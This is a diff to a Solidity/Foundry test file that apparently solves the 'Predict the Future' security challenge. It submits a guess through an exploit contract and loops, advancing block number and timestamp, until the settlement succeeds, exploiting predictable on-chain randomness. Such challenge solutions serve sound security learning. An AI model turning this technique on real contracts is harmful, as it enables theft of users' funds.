@@ -22,6 +22,23 @@ contract PredictTheFutureTest is Test {
         vm.warp(93582192);
 
         // Put your solution here
+        uint256 currentBlockNumber = block.number;
+        uint256 currentBlockTimestamp = block.timestamp;
+
+        // 1. Answer the contract with any number
+        exploitContract.answerAnyNumber{value: 1 ether}();
+
+        for (;;) {
+            // 2. Warp to the next block until the answer is correct
+            currentBlockNumber += 1;
+            currentBlockTimestamp += 12;
+            vm.roll(currentBlockNumber);
+            vm.warp(currentBlockTimestamp);
+
+            try exploitContract.settleOrRevert() {
+                break;
+            } catch (bytes memory) {}
+        }
 
         _checkSolved();
     }
